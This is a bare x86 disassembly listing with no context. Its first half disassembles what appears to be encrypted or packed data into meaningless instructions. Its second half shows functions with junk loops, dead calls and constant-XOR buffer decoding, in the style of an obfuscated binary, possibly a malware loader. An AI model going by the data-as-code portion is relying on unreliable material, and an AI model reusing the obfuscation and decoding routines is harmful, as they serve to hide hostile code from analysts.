  40f2fa:	lods   eax,DWORD PTR ds:[esi]
  40f2fb:	jle    0x40f34e
  40f2fd:	retf   
  40f2fe:	cmp    al,0x3b
  40f300:	push   eax
  40f301:	push   cs
  40f302:	jne    0x40f29f
  40f304:	push   0x962ee6cb
  40f309:	fcom   st(0)
  40f30b:	lods   al,BYTE PTR ds:[esi]
  40f30c:	adc    al,0x55
  40f30e:	ja     0x40f377
  40f310:	out    0x5d,eax
  40f312:	pop    ebx
  40f313:	retf   
  40f314:	sub    eax,0xa54cebb5
  40f319:	mov    bh,0x13
  40f31b:	sbb    ebp,DWORD PTR [ecx-0x48a0e6d]
  40f321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f322:	sub    BYTE PTR [edx],0x75
  40f325:	or     ch,ah
  40f327:	cmp    DWORD PTR ds:0x4635d33d,ebx
  40f32d:	out    0x95,al
  40f32f:	and    eax,DWORD PTR [edi+esi*4+0x6b]
  40f333:	rcl    BYTE PTR [esi+0x25c1be43],cl
  40f339:	scas   eax,DWORD PTR es:[edi]
  40f33a:	inc    eax
  40f33b:	add    ah,BYTE PTR [esi-0x6bede2e0]
  40f341:	outs   dx,BYTE PTR ds:[esi]
  40f342:	add    bh,al
  40f344:	push   ebp
  40f345:	ret    0xb81
  40f348:	xor    al,cl
  40f34a:	repnz gs ins DWORD PTR es:[edi],dx
  40f34d:	push   cs
  40f34e:	dec    esi
  40f34f:	cdq    
  40f350:	mov    DWORD PTR [eax-0x620f54c0],edx
  40f356:	and    bl,BYTE PTR [ecx+0x22]
  40f359:	fiadd  WORD PTR [esi-0x77cdfb18]
  40f35f:	or     al,BYTE PTR [ebx]
  40f361:	outs   dx,BYTE PTR ds:[esi]
  40f362:	addr16 xchg ah,ah
  40f365:	mov    bl,0x7a
  40f367:	addr16 jno 0x40f363
  40f36a:	test   al,0x1
  40f36c:	xor    edx,DWORD PTR [esi-0x2630a504]
  40f372:	out    0x62,eax
  40f374:	scas   al,BYTE PTR es:[edi]
  40f375:	xchg   ebx,eax
  40f376:	test   dl,cl
  40f378:	inc    ebx
  40f379:	xchg   ecx,eax
  40f37a:	mov    eax,0x5a746b43
  40f37f:	nop
  40f380:	test   eax,0xe65dd6c0
  40f385:	jge    0x40f3e9
  40f387:	loope  0x40f3b4
  40f389:	jl     0x40f3d4
  40f38b:	inc    ecx
  40f38c:	mov    eax,0x76bb1911
  40f391:	in     al,0xe
  40f393:	cmp    dl,ch
  40f395:	lods   al,BYTE PTR ds:[esi]
  40f396:	loop   0x40f417
  40f398:	hlt    
  40f399:	(bad)  
  40f39a:	out    dx,eax
  40f39b:	gs pop ds
  40f39d:	pop    ecx
  40f39e:	ds jnp 0x40f3eb
  40f3a1:	jbe    0x40f394
  40f3a3:	dec    ecx
  40f3a4:	dec    edx
  40f3a5:	jg     0x40f349
  40f3a7:	push   edi
  40f3a8:	dec    esp
  40f3a9:	push   esp
  40f3aa:	rcr    DWORD PTR [edi+0x3e],0xff
  40f3ae:	lods   al,BYTE PTR ds:[esi]
  40f3af:	aad    0x51
  40f3b1:	or     ebx,DWORD PTR [eax+edx*4+0x3cf2efc6]
  40f3b8:	mov    edx,ebx
  40f3ba:	sbb    DWORD PTR [eax],0x3acafb4
  40f3c0:	inc    ebx
  40f3c1:	jp     0x40f351
  40f3c3:	jnp    0x40f3f0
  40f3c5:	dec    edx
  40f3c6:	jnp    0x40f366
  40f3c8:	sar    dh,cl
  40f3ca:	jmp    0x40f40c
  40f3cc:	scas   al,BYTE PTR es:[edi]
  40f3cd:	sub    DWORD PTR [ebx],0x1242fcf8
  40f3d3:	data16 jne 0x40f364
  40f3d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3d7:	or     eax,0xb05e7a18
  40f3dc:	jno    0x40f3a5
  40f3de:	mov    ah,bl
  40f3e0:	push   edi
  40f3e1:	out    dx,al
  40f3e2:	adc    BYTE PTR [edx],ah
  40f3e4:	fimul  WORD PTR [ecx+ebp*4+0x5b]
  40f3e8:	push   0xa
  40f3ea:	push   es
  40f3eb:	sub    edi,DWORD PTR [ecx-0x52]
  40f3ee:	or     al,0x34
  40f3f0:	or     bl,BYTE PTR ds:0xba0c7d18
  40f3f6:	icebp  
  40f3f7:	test   eax,0xa804cd1c
  40f3fc:	xor    ch,BYTE PTR [ebx]
  40f3fe:	push   ds
  40f3ff:	fs mov ebx,0xfb260045
  40f405:	dec    ebx
  40f406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f407:	imul   eax,DWORD PTR [eax],0xf5cb4fed
  40f40d:	push   esi
  40f40e:	cmc    
  40f40f:	fldenv [eax]
  40f411:	das    
  40f412:	xchg   BYTE PTR [esi-0x3e],cl
  40f415:	pop    edi
  40f416:	push   edx
  40f417:	xchg   edi,eax
  40f418:	jp     0x40f3b3
  40f41a:	ret    
  40f41b:	push   edi
  40f41c:	scas   eax,DWORD PTR es:[edi]
  40f41d:	ss inc ebp
  40f41f:	ja     0x40f406
  40f421:	mov    ds:0x745ce9f5,al
  40f426:	cmc    
  40f427:	add    BYTE PTR ds:0x6d1ee314,dl
  40f42d:	(bad)  
  40f42e:	jl     0x40f3f9
  40f430:	sti    
  40f431:	dec    ecx
  40f432:	adc    al,0xb2
  40f434:	cli    
  40f435:	shr    BYTE PTR [ebx-0x4f],1
  40f438:	xchg   edx,eax
  40f439:	xchg   BYTE PTR [ebx+0x14f5c94b],dh
  40f43f:	aam    0xba
  40f441:	sub    BYTE PTR [ecx-0xd],cl
  40f444:	int    0xcd
  40f446:	xor    DWORD PTR [eax],edi
  40f448:	inc    ecx
  40f449:	add    DWORD PTR ds:0x36ac9210,esi
  40f44f:	inc    esp
  40f450:	icebp  
  40f451:	jns    0x40f468
  40f453:	in     al,dx
  40f454:	imul   ebp,DWORD PTR [edi],0x23b74b9a
  40f45a:	out    0x14,eax
  40f45c:	or     DWORD PTR [edi],ebp
  40f45e:	or     al,0x2f
  40f460:	mov    dh,0xc3
  40f462:	or     DWORD PTR [eax-0x1d93f0a],esi
  40f468:	stos   BYTE PTR es:[edi],al
  40f469:	and    BYTE PTR [eax],al
  40f46b:	sbb    BYTE PTR [eax+0x10b69a38],al
  40f471:	stos   DWORD PTR es:[edi],eax
  40f472:	and    esp,DWORD PTR [eax]
  40f474:	xchg   ecx,eax
  40f475:	enter  0x29d1,0xb1
  40f479:	test   al,0x4d
  40f47b:	(bad)
  40f47e:	nop
  40f47f:	push   ebp
  40f480:	dec    esp
  40f481:	dec    esi
  40f482:	retf   0x8845
  40f485:	xchg   esp,eax
  40f486:	dec    edi
  40f487:	fsubr  QWORD PTR [eax-0x71a365fb]
  40f48d:	cmp    al,0xa5
  40f48f:	pop    es
  40f490:	adc    ebp,ebp
  40f492:	add    eax,DWORD PTR [edi+edx*4]
  40f495:	jns    0x40f4eb
  40f497:	adc    BYTE PTR [eax-0x9235ee6],dl
  40f49d:	pop    edx
  40f49e:	sub    eax,0x74a43619
  40f4a3:	cmc    
  40f4a4:	(bad)  
  40f4a5:	cdq    
  40f4a6:	mov    BYTE PTR [ebp-0x74],ah
  40f4a9:	into   
  40f4aa:	add    ax,WORD PTR [eax+eax*8+0x362a63ad]
  40f4b2:	xor    al,0x68
  40f4b4:	lods   al,BYTE PTR ds:[esi]
  40f4b5:	das    
  40f4b6:	push   ss
  40f4b7:	(bad)  
  40f4b8:	adc    cl,BYTE PTR [ecx-0x3f]
  40f4bb:	jne    0x40f4e5
  40f4bd:	inc    edi
  40f4be:	mov    ch,0x47
  40f4c0:	xchg   esp,eax
  40f4c1:	hlt    
  40f4c2:	arpl   ax,dx
  40f4c4:	or     bp,WORD PTR [ebx+edx*8+0x5e7da788]
  40f4cc:	xchg   edx,eax
  40f4cd:	sbb    DWORD PTR [edi+0x2aaec08],esi
  40f4d3:	pop    ds
  40f4d4:	sbb    eax,DWORD PTR ds:0xe9c5a9d6
  40f4da:	loopne 0x40f492
  40f4dc:	shl    BYTE PTR [ecx-0x53e7f14],cl
  40f4e2:	lods   eax,DWORD PTR ds:[esi]
  40f4e3:	fs dec esp
  40f4e5:	mov    ch,0x62
  40f4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4e8:	xchg   BYTE PTR [edi-0x63efdf00],cl
  40f4ee:	push   ebx
  40f4ef:	(bad)  
  40f4f0:	popf   
  40f4f1:	push   cs
  40f4f2:	and    ah,BYTE PTR [edx]
  40f4f4:	push   cs
  40f4f5:	pusha  
  40f4f6:	push   0xab07df53
  40f4fb:	ret    
  40f4fc:	scas   al,BYTE PTR es:[edi]
  40f4fd:	sti    
  40f4fe:	add    ah,BYTE PTR [edx+ecx*4+0x23]
  40f502:	push   ebp
  40f503:	repnz addr16 nop
  40f506:	ja     0x40f4f0
  40f508:	cmp    bh,BYTE PTR [esi]
  40f50a:	addr16 push esp
  40f50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f50d:	rol    DWORD PTR [edx-0x1a057a01],0xff
  40f514:	sbb    al,0x5
  40f516:	adc    al,0x46
  40f518:	hlt    
  40f519:	sbb    esp,eax
  40f51b:	ret    0xbb97
  40f51e:	mov    ds:0xc0bb25da,eax
  40f523:	out    0x90,eax
  40f525:	and    cl,BYTE PTR [ecx+ecx*1-0xd]
  40f529:	call   0x1857:0x3e165c62
  40f530:	cmp    eax,0x7a04547f
  40f535:	fist   WORD PTR [edi+0x36]
  40f538:	fcomp  QWORD PTR [esp+ebx*2-0x43]
  40f53c:	in     al,dx
  40f53d:	js     0x40f541
  40f53f:	pop    es
  40f540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f541:	mov    edi,0x44a35aae
  40f546:	pop    ds
  40f547:	fstp   st(3)
  40f549:	idiv   BYTE PTR [eax]
  40f54b:	int    0xa
  40f54d:	test   cl,bl
  40f54f:	adc    BYTE PTR [eax],0xf4
  40f552:	push   ds
  40f553:	imul   ebp,esp,0xffffff90
  40f556:	fidivr WORD PTR [ebx-0xebad538]
  40f55c:	xchg   BYTE PTR [esi-0x4ac17a9],dl
  40f562:	into   
  40f563:	pushf  
  40f564:	mov    ch,0xff
  40f566:	sbb    edi,DWORD PTR [edi-0x35]
  40f569:	jle    0x40f598
  40f56b:	pop    eax
  40f56c:	ret    0x9e21
  40f56f:	in     eax,0xde
  40f571:	and    al,0x7a
  40f573:	lock push eax
  40f575:	rol    BYTE PTR [edx],cl
  40f577:	cmc    
  40f578:	pop    ebx
  40f579:	repnz inc ebx
  40f57b:	ret    
  40f57c:	sbb    BYTE PTR ds:0x1b3c4c86,ch
  40f582:	add    BYTE PTR [edi],ch
  40f584:	lods   al,BYTE PTR ds:[esi]
  40f585:	fwait
  40f586:	add    BYTE PTR [edi-0x6ac6e2c5],0x5f
  40f58d:	xor    BYTE PTR [eax-0x23113e67],0x65
  40f594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f595:	sar    al,0x7d
  40f598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f599:	pop    esi
  40f59a:	push   ebp
  40f59b:	lods   al,BYTE PTR ds:[esi]
  40f59c:	and    al,0xcc
  40f59e:	mov    edx,0xe417e147
  40f5a3:	cli    
  40f5a4:	popf   
  40f5a5:	push   ecx
  40f5a6:	or     edi,DWORD PTR [edx+0x34]
  40f5a9:	loopne 0x40f61b
  40f5ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5ac:	or     ebx,DWORD PTR [eax-0x53b9bbb5]
  40f5b2:	sub    eax,0x2a480ba0
  40f5b7:	xor    eax,0xdf087db1
  40f5bc:	mov    ds:0xa4145982,eax
  40f5c1:	in     eax,dx
  40f5c2:	jmp    0x40f565
  40f5c4:	imul   edi,ecx,0xffffffa9
  40f5c7:	fcmovu st,st(5)
  40f5c9:	test   BYTE PTR [ebp+0x18],0x4c
  40f5cd:	add    esp,DWORD PTR [ecx+0x3136eccf]
  40f5d3:	adc    BYTE PTR [ecx],dl
  40f5d5:	mov    gs,WORD PTR [ecx]
  40f5d7:	mov    esp,0xaa26af9f
  40f5dc:	pop    ss
  40f5dd:	in     al,dx
  40f5de:	push   ecx
  40f5df:	and    DWORD PTR [eax+0x4d],eax
  40f5e2:	sub    al,0x2d
  40f5e4:	retf   0xfa3
  40f5e7:	sub    esi,DWORD PTR [ecx+0x1b497d55]
  40f5ed:	(bad)
  40f5f0:	(bad)  
  40f5f1:	or     BYTE PTR [edx+0x48],dh
  40f5f4:	mov    dh,0x2e
  40f5f6:	jmp    0x5f843349
  40f5fb:	in     eax,dx
  40f5fc:	and    ecx,DWORD PTR [edi+ebp*4]
  40f5ff:	mov    cl,0xea
  40f601:	sbb    esi,ebp
  40f603:	xchg   esp,eax
  40f604:	sbb    DWORD PTR [edi-0x7c],edx
  40f607:	int3   
  40f608:	xchg   ebx,eax
  40f609:	out    dx,al
  40f60a:	push   ebp
  40f60b:	data16 mov bl,0xa5
  40f60e:	mov    al,ds:0xe27730a8
  40f613:	ds push es
  40f615:	push   ebx
  40f616:	into   
  40f617:	adc    bh,BYTE PTR [edx+0x5b6a0786]
  40f61d:	cmp    ecx,esp
  40f61f:	stos   DWORD PTR es:[edi],eax
  40f620:	add    BYTE PTR [eax+0x7b],0xb5
  40f624:	jmp    0xd729feed
  40f629:	xlat   BYTE PTR ds:[ebx]
  40f62a:	push   es
  40f62b:	hlt    
  40f62c:	sbb    al,0x7e
  40f62e:	inc    ecx
  40f62f:	jbe    0x40f633
  40f631:	mov    ecx,edx
  40f633:	in     eax,0xf4
  40f635:	cmp    al,0xe6
  40f637:	and    DWORD PTR [esi],esp
  40f639:	pop    eax
  40f63a:	push   ds
  40f63b:	sbb    dl,BYTE PTR [esi+0x45df51ed]
  40f641:	sti    
  40f642:	icebp  
  40f643:	xchg   esi,eax
  40f644:	pop    edx
  40f645:	push   es
  40f646:	sub    ebp,DWORD PTR [edi-0x4e]
  40f649:	pop    ecx
  40f64a:	xor    eax,DWORD PTR [edx]
  40f64c:	sub    eax,0xe41b231c
  40f651:	out    dx,eax
  40f652:	push   ebp
  40f653:	lahf   
  40f654:	add    DWORD PTR [edi],edx
  40f656:	cmp    BYTE PTR [esi-0x73],bh
  40f659:	fist   DWORD PTR [edx]
  40f65b:	punpckhdq mm5,mm3
  40f65e:	mov    ecx,0xe751efbb
  40f663:	in     eax,dx
  40f664:	stos   BYTE PTR es:[edi],al
  40f665:	sti    
  40f666:	and    DWORD PTR [ebx],edx
  40f668:	sbb    edx,DWORD PTR [ebp-0x5cc0c9fa]
  40f66e:	adc    eax,0x7463eac0
  40f673:	bound  ecx,QWORD PTR [ebp-0x36]
  40f676:	enter  0xf34,0x86
  40f67a:	jmp    0x40f604
  40f67c:	int3   
  40f67d:	push   ebx
  40f67e:	enter  0xcc35,0x16
  40f682:	or     BYTE PTR ds:0x1b812269,al
  40f688:	pushf  
  40f689:	dec    ecx
  40f68a:	mov    ds:0xb159e67a,eax
  40f68f:	mov    ecx,0x5d18f77
  40f694:	dec    ecx
  40f695:	clc    
  40f696:	iret   
  40f697:	pop    edx
  40f698:	out    0xcd,eax
  40f69a:	push   0xfffffff0
  40f69c:	retf   
  40f69d:	js     0x40f6fd
  40f69f:	into   
  40f6a0:	call   0x6eee:0xa07442a3
  40f6a7:	dec    ebx
  40f6a8:	sahf   
  40f6a9:	dec    ebp
  40f6aa:	int    0xfc
  40f6ac:	js     0x40f717
  40f6ae:	dec    eax
  40f6af:	cli    
  40f6b0:	pop    esp
  40f6b1:	push   ss
  40f6b2:	mov    bl,0xd6
  40f6b4:	or     eax,0x78919055
  40f6b9:	out    0x5a,eax
  40f6bb:	lahf   
  40f6bc:	mov    esi,0x69283e16
  40f6c1:	in     eax,0xda
  40f6c3:	mov    ds:0x60844812,al
  40f6c8:	dec    ebx
  40f6c9:	cwde   
  40f6ca:	push   edx
  40f6cb:	jecxz  0x40f6fb
  40f6cd:	sbb    edx,ebp
  40f6cf:	lea    esi,[edi]
  40f6d1:	cdq    
  40f6d2:	sbb    DWORD PTR ds:0x30502ff1,edx
  40f6d8:	loop   0x40f745
  40f6da:	outs   dx,BYTE PTR ds:[esi]
  40f6db:	iret   
  40f6dc:	inc    esp
  40f6dd:	fwait
  40f6de:	es retf 0xb257
  40f6e2:	in     eax,0x4
  40f6e4:	rcl    dl,cl
  40f6e6:	push   ebx
  40f6e7:	(bad)  
  40f6e9:	jns    0x40f70b
  40f6eb:	and    esp,edx
  40f6ed:	cld    
  40f6ee:	mov    es,WORD PTR [ebx+ebx*8]
  40f6f1:	mov    esi,0x29c51c93
  40f6f6:	dec    edx
  40f6f7:	out    0x8a,eax
  40f6f9:	pop    edx
  40f6fa:	(bad)  
  40f6fc:	shl    BYTE PTR [edi+0x9ace163],0x50
  40f703:	popf   
  40f704:	inc    ebp
  40f705:	aam    0x3c
  40f707:	addr16 sahf 
  40f709:	lds    ebp,FWORD PTR [edx+0x50]
  40f70c:	add    BYTE PTR [eax+0x5a81c21c],cl
  40f712:	push   edx
  40f713:	loop   0x40f706
  40f715:	lock hlt 
  40f717:	mov    ah,0x14
  40f719:	enter  0xf640,0x8a
  40f71d:	mov    al,ds:0x8e090e58
  40f722:	(bad)  
  40f724:	adc    BYTE PTR [ebx-0x355e936a],bh
  40f72a:	xchg   DWORD PTR [ebp-0x694bb232],edx
  40f730:	xlat   BYTE PTR ds:[ebx]
  40f731:	add    eax,0xbbfd7751
  40f736:	sub    bh,BYTE PTR [edi]
  40f738:	xor    bl,ch
  40f73a:	and    esi,DWORD PTR [eax+0x50]
  40f73d:	cli    
  40f73e:	jmp    0x8b66:0x1cbc8a60
  40f745:	or     eax,ebp
  40f747:	pop    edi
  40f748:	shr    DWORD PTR [ecx],cl
  40f74a:	sbb    dh,al
  40f74c:	mov    bl,0x9e
  40f74e:	int    0xaf
  40f750:	test   al,0x3
  40f752:	loopne 0x40f6e6
  40f754:	push   eax
  40f755:	xor    ebx,ebx
  40f757:	mov    edx,esp
  40f759:	dec    edx
  40f75a:	inc    ebx
  40f75b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f75e:	dec    ebx
  40f75f:	xor    edx,edx
  40f761:	add    DWORD PTR [ebp-0x10],ebx
  40f764:	pop    ebx
  40f765:	mov    eax,DWORD PTR [ebp-0x10]
  40f768:	pop    edi
  40f769:	pop    esi
  40f76a:	pop    ebx
  40f76b:	leave  
  40f76c:	ret    0x10
  40f76f:	push   ebp
  40f770:	mov    ebp,esp
  40f772:	push   ecx
  40f773:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40f77a:	mov    ecx,DWORD PTR ds:0x42b26e
  40f780:	mov    edx,DWORD PTR ds:0x42b2da
  40f786:	sub    edx,ecx
  40f788:	xor    ecx,DWORD PTR [ecx+edx*1]
  40f78b:	mov    eax,DWORD PTR [ebp-0x4]
  40f78e:	and    DWORD PTR ds:0x42b226,0x0
  40f798:	mov    edx,DWORD PTR ds:0x42b226
  40f79e:	inc    edx
  40f79f:	mov    DWORD PTR ds:0x42b226,edx
  40f7a5:	cmp    DWORD PTR ds:0x42b226,0xb
  40f7ac:	jb     0x40f7f2
  40f7b2:	jmp    0x40f7cb
  40f7b7:	push   DWORD PTR [ebp-0x24]
  40f7ba:	push   DWORD PTR [ebp-0x24]
  40f7bd:	push   0x42a23f
  40f7c2:	push   DWORD PTR [ebp-0x1c]
  40f7c5:	call   DWORD PTR ds:0x42b306
  40f7cb:	cmp    DWORD PTR ds:0x42b226,0xa
  40f7d2:	jne    0x40f7e5
  40f7d8:	mov    edx,DWORD PTR ds:0x42b226
  40f7de:	inc    edx
  40f7df:	mov    DWORD PTR ds:0x42b226,edx
  40f7e5:	cmp    DWORD PTR ds:0x42b226,0x17
  40f7ec:	jb     0x40f798
  40f7f2:	mov    edx,DWORD PTR [ebp+0x10]
  40f7f5:	mov    ecx,0x75108ae
  40f7fa:	add    DWORD PTR ds:0x42b1ea,0x1734
  40f804:	xor    eax,ecx
  40f806:	add    eax,0x3272f5
  40f80b:	mov    DWORD PTR [edx],eax
  40f80d:	mov    eax,DWORD PTR [ebp+0xc]
  40f810:	xor    eax,ecx
  40f812:	push   esi
  40f813:	mov    esi,DWORD PTR [ebp+0x10]
  40f816:	mov    edx,0x3272f5
  40f81b:	add    eax,edx
  40f81d:	mov    DWORD PTR [esi+0x4],eax
  40f820:	mov    eax,DWORD PTR [ebp+0x14]
  40f823:	mov    esi,DWORD PTR [ebp+0x10]
  40f826:	mov    DWORD PTR [esi+0x8],eax
  40f829:	mov    eax,DWORD PTR [ebp+0x18]
  40f82c:	mov    esi,DWORD PTR [ebp+0x10]
  40f82f:	mov    DWORD PTR [esi+0xc],eax
  40f832:	mov    eax,DWORD PTR [ebp+0x1c]
  40f835:	mov    esi,DWORD PTR [ebp+0x10]
  40f838:	mov    DWORD PTR [esi+0x10],eax
  40f83b:	mov    eax,DWORD PTR [ebp+0x8]
  40f83e:	xor    eax,ecx
  40f840:	add    eax,edx
  40f842:	pop    esi
  40f843:	leave  
  40f844:	ret    0x18
  40f847:	push   ebp
  40f848:	mov    ebp,esp
  40f84a:	sub    esp,0x9c
  40f850:	and    DWORD PTR ds:0x42b1b6,0x0
  40f85a:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f860:	inc    ecx
  40f861:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f867:	cmp    DWORD PTR ds:0x42b1b6,0xd
  40f86e:	ja     0x40f8b2
  40f874:	jmp    0x40f88b
  40f879:	push   0x42a1d7
  40f87e:	push   0x0
  40f880:	push   0x7b23
  40f885:	call   DWORD PTR ds:0x42b30e
  40f88b:	cmp    DWORD PTR ds:0x42b1b6,0xc
  40f892:	jne    0x40f8a5
  40f898:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f89e:	inc    ecx
  40f89f:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f8a5:	cmp    DWORD PTR ds:0x42b1b6,0x14
  40f8ac:	jb     0x40f85a
  40f8b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8b5:	xor    eax,DWORD PTR ds:0x42b1a6
  40f8bb:	mov    eax,0x8a9a
  40f8c0:	xor    ax,WORD PTR [ecx+0x20]
  40f8c4:	xor    DWORD PTR ds:0x42b1d6,ebx
  40f8ca:	mov    ecx,0x3b5c
  40f8cf:	adc    DWORD PTR ds:0x42b206,0x42b22e
  40f8d9:	add    ax,cx
  40f8dc:	and    DWORD PTR ds:0x42b1ba,0x0
  40f8e6:	mov    ecx,DWORD PTR ds:0x42b1ba
  40f8ec:	inc    ecx
  40f8ed:	mov    DWORD PTR ds:0x42b1ba,ecx
  40f8f3:	cmp    DWORD PTR ds:0x42b1ba,0x1e
  40f8fa:	jge    0x40f91b
  40f900:	jmp    0x40f90e
  40f905:	push   DWORD PTR [ebp-0x20]
  40f908:	call   DWORD PTR ds:0x42b316
  40f90e:	cmp    DWORD PTR ds:0x42b1ba,0x19
  40f915:	jb     0x40f8e6
  40f91b:	movzx  eax,ax
  40f91e:	or     ecx,DWORD PTR ds:0x42b1fa
  40f924:	mov    DWORD PTR [ebp-0x10],eax
  40f927:	and    DWORD PTR ds:0x42b1a2,0x5305
  40f931:	mov    BYTE PTR [ebp-0x1],0x80
  40f935:	mov    ecx,DWORD PTR ds:0x42b22a
  40f93b:	sub    DWORD PTR ds:0x42b1f6,ecx
  40f941:	lea    eax,[ebp-0x1]
  40f944:	mov    DWORD PTR ds:0x42b21e,0x14
  40f94e:	cmp    DWORD PTR ds:0x42b21e,0x0
  40f955:	je     0x40f9a6
  40f95b:	cmp    DWORD PTR ds:0x42b21e,0x4
  40f962:	ja     0x40f9a6
  40f968:	jmp    0x40f97a
  40f96d:	push   0x5
  40f96f:	push   0x6029
  40f974:	call   DWORD PTR ds:0x42b31a
  40f97a:	cmp    DWORD PTR ds:0x42b21e,0x5
  40f981:	jne    0x40f994
  40f987:	mov    ecx,DWORD PTR ds:0x42b21e
  40f98d:	dec    ecx
  40f98e:	mov    DWORD PTR ds:0x42b21e,ecx
  40f994:	mov    ecx,DWORD PTR ds:0x42b21e
  40f99a:	dec    ecx
  40f99b:	mov    DWORD PTR ds:0x42b21e,ecx
  40f9a1:	jmp    0x40f94e
  40f9a6:	mov    DWORD PTR [ebp-0xc],eax
  40f9a9:	or     ecx,DWORD PTR ds:0x42b212
  40f9af:	mov    al,BYTE PTR [ebp-0x1]
  40f9b2:	xor    DWORD PTR ds:0x42b226,0x485
  40f9bc:	mov    ecx,DWORD PTR [ebp-0xc]
  40f9bf:	xor    al,0x7e
  40f9c1:	add    al,0x3
  40f9c3:	and    DWORD PTR ds:0x42b20a,0x20b6
  40f9cd:	mov    BYTE PTR [ecx],al
  40f9cf:	sbb    ecx,0x5f8e
  40f9d5:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  40f9dc:	push   ebx
  40f9dd:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  40f9e4:	and    DWORD PTR ds:0x42b1da,0x0
  40f9ee:	jmp    0x40f9fe
  40f9f3:	mov    eax,ds:0x42b1da
  40f9f8:	inc    eax
  40f9f9:	mov    ds:0x42b1da,eax
  40f9fe:	cmp    DWORD PTR ds:0x42b1da,0x14
  40fa05:	jae    0x40fa55
  40fa0b:	cmp    DWORD PTR ds:0x42b1da,0xb
  40fa12:	jbe    0x40fa55
  40fa18:	jmp    0x40fa35
  40fa1d:	push   0x42b1f2
  40fa22:	push   DWORD PTR [ebp-0xc]
  40fa25:	push   0x42a000
  40fa2a:	push   0x42a18d
  40fa2f:	call   DWORD PTR ds:0x42b31e
  40fa35:	cmp    DWORD PTR ds:0x42b1da,0xa
  40fa3c:	jne    0x40fa50
  40fa42:	xor    eax,eax
  40fa44:	xor    eax,DWORD PTR ds:0x42b1da
  40fa4a:	inc    eax
  40fa4b:	mov    ds:0x42b1da,eax
  40fa50:	jmp    0x40f9f3
  40fa55:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa58:	sub    DWORD PTR ds:0x42b1fa,0x685a
  40fa62:	push   esi
  40fa63:	dec    esi
  40fa64:	mov    eax,0x75108ae
  40fa69:	and    DWORD PTR ds:0x42b1b2,0x4a0b
  40fa73:	xor    ecx,eax
  40fa75:	or     DWORD PTR ds:0x42b212,ebx
  40fa7b:	mov    esi,0x3272f5
  40fa80:	adc    DWORD PTR ds:0x42b216,0x42b222
  40fa8a:	push   edi
  40fa8b:	and    DWORD PTR ds:0x42b19a,0x42b1a2
  40fa95:	add    ecx,esi
  40fa97:	mov    DWORD PTR ds:0x42b212,0x27f7
  40faa1:	jmp    0x40facf
  40faa6:	mov    DWORD PTR ds:0x42b1a2,0x4c70
  40fab0:	mov    dl,BYTE PTR [ebp-0x1]
  40fab3:	mov    DWORD PTR ds:0x42b1da,0x7ef5
  40fabd:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40fac4:	mov    DWORD PTR ds:0x42b21a,0x736d
  40face:	inc    ecx
  40facf:	mov    DWORD PTR ds:0x42b1b2,0x61ef
  40fad9:	cmp    ecx,0x40
  40fadc:	jb     0x40faa6
  40fae2:	sbb    edx,DWORD PTR ds:0x42b1de
  40fae8:	mov    edx,DWORD PTR [ebp-0x18]
  40faeb:	adc    DWORD PTR ds:0x42b18e,0x3f3e
  40faf5:	xor    edx,eax
  40faf7:	sub    DWORD PTR ds:0x42b1d2,0x42b1ce
  40fb01:	add    edx,esi
  40fb03:	jmp    0x40fbc0
  40fb08:	mov    edi,DWORD PTR [ebp+0x8]
  40fb0b:	mov    ecx,0x8a9a
  40fb10:	sbb    DWORD PTR ds:0x42b1e6,0x42b226
  40fb1a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40fb1f:	adc    DWORD PTR ds:0x42b1de,ecx
  40fb25:	mov    edi,0x3b5c
  40fb2a:	xor    DWORD PTR ds:0x42b1ca,0x42b1a2
  40fb34:	add    cx,di
  40fb37:	adc    DWORD PTR ds:0x42b1b6,0x7f83
  40fb41:	movzx  ecx,cx
  40fb44:	and    DWORD PTR ds:0x42b1f6,0x42b18a
  40fb4e:	mov    DWORD PTR [ebp-0xc],ecx
  40fb51:	and    DWORD PTR ds:0x42b21a,0x0
  40fb5b:	jmp    0x40fb6d
  40fb60:	mov    ecx,DWORD PTR ds:0x42b21a
  40fb66:	inc    ecx
  40fb67:	mov    DWORD PTR ds:0x42b21a,ecx
  40fb6d:	cmp    DWORD PTR ds:0x42b21a,0x19
  40fb74:	jae    0x40fb9c
  40fb7a:	cmp    DWORD PTR ds:0x42b21a,0x1e
  40fb81:	jge    0x40fb9c
  40fb87:	jmp    0x40fb97
  40fb8c:	push   0x1c76
  40fb91:	call   DWORD PTR ds:0x42b322
  40fb97:	jmp    0x40fb60
  40fb9c:	mov    ecx,DWORD PTR [ebp+0x8]
  40fb9f:	add    DWORD PTR ds:0x42b1d2,0x42b1ea
  40fba9:	movzx  ecx,WORD PTR [ecx+edx*4]
  40fbad:	xor    ecx,0x8a9a
  40fbb3:	add    ecx,edi
  40fbb5:	mov    edi,DWORD PTR [ebp-0xc]
  40fbb8:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fbbf:	inc    edx
  40fbc0:	mov    ecx,0xfa9
  40fbc5:	mov    ecx,DWORD PTR [ebp-0x10]
  40fbc8:	cmp    edx,ecx
  40fbca:	jne    0x40fb08
  40fbd0:	mov    DWORD PTR ds:0x42b186,0x1e
  40fbda:	cmp    DWORD PTR ds:0x42b186,0x0
  40fbe1:	je     0x40fc18
  40fbe7:	cmp    DWORD PTR ds:0x42b186,0x24
  40fbee:	jle    0x40fc18
  40fbf4:	jmp    0x40fc04
  40fbf9:	push   0x7864
  40fbfe:	call   DWORD PTR ds:0x42b326
